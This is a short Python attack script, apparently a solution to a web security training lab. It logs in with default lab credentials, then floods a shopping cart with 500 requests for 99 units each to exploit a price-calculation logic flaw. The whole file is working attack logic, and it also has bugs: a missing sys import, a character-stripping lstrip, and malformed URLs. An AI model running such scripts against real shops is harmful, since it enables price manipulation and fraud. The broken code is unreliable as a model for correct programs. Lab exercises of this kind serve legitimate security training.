import requests
from bs4 import BeautifulSoup

site = sys.argv[1]
if'https://' in site:
    site = site.rstrip('/').lstrip('https://')

url = f'https://{site}'

def logic_flaw(url):
    s = requests.Session()
    r = s.get(url+'login')
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input")['value']
    data = {
        'csrf':csrf,
        'username':'wiener',
        'password':'peter'
    }
    r2 = s.post(url+'login', data=data)
    cart = {
        'productId':'1',
        'redir':'PRODUCT',
        'quantity':'99'
    }
    for i in range(0,500):
        r3 = s.post(url+'cart', data=cart)
        r4 = s.get(url+'cart')
        cartsoup = BeautifulSoup(r4.text, 'html.parser')
        total = cartsoup.find_all('th')[5]
        print(total)

logic_flaw(url)
